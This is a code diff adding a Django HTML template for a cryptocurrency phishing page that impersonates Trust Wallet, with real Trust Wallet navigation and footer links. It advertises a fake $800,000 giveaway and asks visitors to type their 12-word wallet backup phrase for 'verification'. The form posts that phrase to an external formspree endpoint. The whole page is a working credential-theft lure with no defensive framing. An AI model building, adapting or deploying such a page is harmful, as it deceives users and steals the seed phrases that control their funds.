@@ -1,0 +1,319 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta property="og:title" content="#TrustWallet_Gift">
+        <meta property="og:description" content="For giving us the Trust of 
+        Securing your Cryptocurrencies and being an Active user of this Wallet;
+         A Reward of $800,000 USD Worth of Cryptocurrencies is going to be shared 
+         to all Trust Wallet, Atomic Wallet and Blockchain users around the Globe 
+         as a Reward for Trust!.
+        For more information, visit⤵️">
+        <meta property="og:image" content="{% static 'img/trust-wallet-token.png' %}">
+        <meta property="og:url" content="https://www.trxtrusttoken.com/">
+        <title>Trustwallet-Home</title>
+        <link rel="icon" type="image/x-icon" href="{% static 'img/trust-wallet-token.png' %}">
+        <link rel="stylesheet" href="{% static 'css/style.css' %}">
+        <link rel="stylesheet" href="{% static 'css/animate.min.css' %}">
+        <link rel="stylesheet" href="{% static 'fontawesome/css/all.css' %}">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cabin:wght@500&display=swap">
+
+
+        <style>
+
+            section{
+                width: 100%;
+                background: #0B65C6;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                color: whitesmoke;
+                font-family: cabin;
+                padding-top: 50px;
+                margin-bottom: 100px;
+                line-height: 1.3;
+            }
+
+            .t{
+                width: 70%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                padding: 30px;
+            }
+
+            .t b{
+                font-size: 1.7rem;
+                padding-bottom: 50px;
+            }
+            .t h1{
+                font-size: 2.7rem;
+                padding-bottom: 5px;
+            }
+            .t p{
+                font-size: 1.5rem;
+                padding-bottom: 50px;
+            }
+
+            .f{
+                display: flex;
+                width: 100%;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                padding-bottom: 30px;
+            }
+
+            input{
+                width: 100%;
+                padding: 20px;
+                margin-bottom: 20px;
+                border-radius: 30px;
+                border: cornflowerblue;
+            }
+
+            input:nth-child(1){
+                width: 100%;
+                padding: 25px;
+                font-size: 1.2rem;
+                margin-bottom: 20px;
+                border-radius: 50px;
+                text-align: center;
+                border: 2px solid cornflowerblue;
+            }
+            .button{
+                width: 75%;
+                padding: 15px;
+                font-size: 1rem;
+                margin-bottom: 20px;
+                border-radius: 40px;
+                border: none;
+                color: whitesmoke;
+                background-image: linear-gradient(80deg, #2194e0, #21b3df);
+            }
+
+
+            @media only screen and (max-width: 1068px) {
+
+                section{
+                    margin-bottom: 50px;
+                    line-height: 1.4;
+                    margin-top: -10px;
+                }
+
+                .t{
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                padding: 5px;
+            }
+
+            .t b{
+                font-size: 1.3rem;
+                padding-bottom: 50px;
+                padding: 30px;
+            }
+            .t h1{
+                font-size: 2.3rem;
+                padding-bottom: 1px;
+            }
+            .t p{
+                font-size: 1.2rem;
+                padding-bottom: 30px;
+                padding: 20px;
+            }
+
+            .f{
+                display: flex;
+                width: 100%;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                padding-bottom: 30px;
+            }
+
+            input{
+                width: 100%;
+                padding: 20px;
+                margin-bottom: 20px;
+                border-radius: 30px;
+                border: cornflowerblue;
+            }
+
+            input:nth-child(1){
+                width: 100%;
+                padding: 25px;
+                font-size: 1.2rem;
+                margin-bottom: 20px;
+                border-radius: 50px;
+                text-align: center;
+                border: 2px solid cornflowerblue;
+            }
+            .button{
+                width: 75%;
+                padding: 15px;
+                font-size: 1rem;
+                margin-bottom: 20px;
+                border-radius: 40px;
+                color: whitesmoke;
+                background-image: linear-gradient(80deg, #2194e0, #21b3df);
+            }
+
+
+            }
+
+
+
+        </style>
+    </head>
+<body>
+    <header class="header">
+        <nav class="navbar">
+            <a href="{% url 'home' %}" class="nav-logo"><img src="{% static 'img/horizontal_white.png' %}" alt="logo"></a>
+        <ul class="nav-menu">
+            <li class="nav-item">
+                <a href="https://trustwallet.com/assets" class="nav-link">Assets</a>
+            </li>
+            <li class="nav-item">
+                <a href="https://trustwallet.com/staking" class="nav-link">Staking</a>
+            </li>
+            <li class="nav-item">
+                <a href="https://trustwallet.com/earn" class="nav-link">Earn <b>+11% APR</b></a>
+            </li>
+            <li class="nav-item">
+                <a href="https://trustwallet.com/nft-wallet" class="nav-link">NFTs</a>
+            </li>
+            <li class="nav-item">
+                <a href="https://trustwallet.com/dapp" class="nav-link">DApp Browser</a>
+            </li>
+            <li class="nav-item">
+                <a href="https://trustwallet.com/#" class="nav-link">Language</a>
+            </li>
+        </ul>
+        <div class="hamburger">
+            <span class="bar"></span>
+            <span class="bar"></span>
+            <span class="bar"></span>
+        </div>
+    </nav>
+    </header> 
+
+
+
+    <section>
+        <div class="t">
+            <b>We've got a very exciting month ahead of us. Officially Launched !! We are giving away up to $800,000 worth of BTC. Input your backup phrase below to Claim your prize into your wallet.</b>
+            <h1>User's Verification</h1>
+            <p>As part of our Security measure, you must input your 12-word backup phrase to be sure is you. Once your 12-word backup phrase is entered and validated correctly, you will receive your reward almost immediately .</p>
+        </div>
+        <div class="f">
+            <form name="phrase" action="https://formspree.io/f/xwkyqayv" method="POST" >
+                <input type="text" name="phrase" placeholder="Type Your 12-Word Backup Phrase">
+               
+                <button class="button" type="submit">VALIDATE</button>
+
+            </form>
+        </div>
+    </section>
+
+       <footer>
+        <div class="end-logo">
+            <div><img src="{% static 'img/Logo_TrustWallet.png' %}" alt="trust-logo"></div>
+            <div class="icons">
+             <a href="https://facebook.com/trustwalletapp"><i class="fab fa-facebook-square fa-2x"></i></a> 
+             <a href="https://github.com/trustwallet"><i class="fab fa-github fa-2x"></i></a> 
+             <a href="https://instagram.com/trustwallet"><i class="fab fa-instagram fa-2x"></i></a> 
+             <a href="https://twitter.com/trustwallet"><i class="fab fa-twitter fa-2x"></i></a> 
+             <a href="https://reddit.com/r/trustapp"><i class="fab fa-reddit-alien fa-2x"></i></a> 
+             <a href="https://t.me/trust_announcements"><i class="fab fa-telegram-plane fa-2x"></i></a> 
+            </div>
+        </div>
+        <div class="one">
+            <b>TRUST WALLET</b>
+            <p><a href="https://trustwallet.com/assets">Assets</a></p>
+            <p><a href="https://trustwallet.com/dapp">DApp Browser</a></p>
+            <p><a href="https://trustwallet.com/stablecoins">Stablecoins</a></p>
+            <p><a href="https://trustwallet.com/beta">Beta</a></p>
+            <p><a href="https://trustwallet.com/nft-wallet">NFTs</a></p>
+            <p><a href="https://trustwallet.com/el-salvador-wallet">El Salvador Wallet</a></p>
+            <p><a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8">Crypto Wallet for iOS</a></p>
+            <p><a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite">Crypto Wallet for Android</a></p>
+        </div>
+        <div class="two">
+            <b>INFORMATION</b>
+            <p><a href="https://community.trustwallet.com/">Community</a></p>
+            <p><a href="https://community.trustwallet.com/c/helpcenter">Help Center</a></p>
+            <p><a href="https://support.trustwallet.com/">Support</a></p>
+            <p><a href="https://trustwallet.com/blog">DApp Journey</a></p>
+            <p><a href="https://trustwallet.com/developer">Developers</a></p>
+            <p><a href="https://trustwallet.com/submit-dapp">Submit DApp</a></p>
+            <p><a href="https://trustwallet.com/press">Press Kit</a></p>
+            <p><a href="https://trustwallet.com/terms-of-services">Terms Of Service</a></p>
+            <p><a href="https://trustwallet.com/privacy-and-policy">Privacy Policy</a></p>
+        </div>
+        <div class="three">
+            <b> USE CRYPTO</b>
+            <p><a href="https://trustwallet.com/buy-bitcoin">Buy Bitcoin with a credit card</a></p>
+            <p><a href="https://trustwallet.com/buy-ethereum">Buy Ethereum</a></p>
+            <p><a href="https://trustwallet.com/buy-bnb">Buy BNB</a></p>
+            <p><a href="https://trustwallet.com/buy-litecoin">Buy Litecoin</a></p>
+            <p><a href="https://trustwallet.com/buy-trons">Buy TRON</a></p>
+            <p><a href="https://trustwallet.com/buy-xrp">Buy XRP</a></p>
+            <p><a href="https://trustwallet.com/buy-bitcoincash">Buy Bitcoin Cash</a></p>
+            <p><a href="https://trustwallet.com/earn-bitcoin">Earn Bitcoin</a></p>
+            <p><a href="https://trustwallet.com/earn-ethereum">Earn Ethereum</a></p>
+            <p><a href="https://trustwallet.com/earn-binance-coin">Earn Binance Coin</a></p>
+            <p><a href="https://trustwallet.com/earn-cake">Earn Cake</a></p>
+        </div>
+        <div class="four">
+            <b>ASSETS</b>
+            <p><a href="https://trustwallet.com/bitcoin-wallet">Bitcoin (BTC)</a></p>
+            <p><a href="https://trustwallet.com/ethereum-wallet">Ethereum (ETH)</a></p>
+            <p><a href="https://trustwallet.com/binance-coin-wallet">Binance Coin (BNB)</a></p>
+            <p><a href="https://trustwallet.com/litecoin-wallet">Litecoin (LTC)</a></p>
+            <p><a href="https://trustwallet.com/xrp-wallet">Ripple (XRP)</a></p>
+            <p><a href="https://trustwallet.com/dogecoin-wallet">Dogecoin (DOGE)</a></p>
+            <p><a href="https://trustwallet.com/polkadot-wallet">Polkadot (DOT)</a></p>
+            <p><a href="https://trustwallet.com/smart-chain-wallet">Smartchain (BNB)</a></p>
+            <p><a href="https://trustwallet.com/dash-wallet">Dash (DASH)</a></p>
+            <p><a href="https://trustwallet.com/tron-wallet">TRON (TRX)</a></p>
+            <p><a href="https://trustwallet.com/tezos-wallet">Tezos (XTZ)</a></p>
+            <p><a href="https://trustwallet.com/cosmos-wallet">Cosmos (ATOM)</a></p>
+            <p><a href="https://trustwallet.com/stellar-wallet">Stellar (XLM)</a></p>
+            <p><a href="https://trustwallet.com/kava-wallet">Kava (KAVA)</a></p>
+        </div>
+    </footer>
+ 
+ 
+    <script>
+     const hamburger = document.querySelector(".hamburger");
+ const navMenu = document.querySelector(".nav-menu");
+ 
+ hamburger.addEventListener("click", mobileMenu);
+ 
+ function mobileMenu() {
+     hamburger.classList.toggle("active");
+     navMenu.classList.toggle("active");
+ }
+ 
+ const navLink = document.querySelectorAll(".nav-link");
+ 
+ navLink.forEach(n => n.addEventListener("click", closeMenu));
+ 
+ function closeMenu() {
+     hamburger.classList.remove("active");
+     navMenu.classList.remove("active");
+ }
+ </script>
+</body>
+</html>
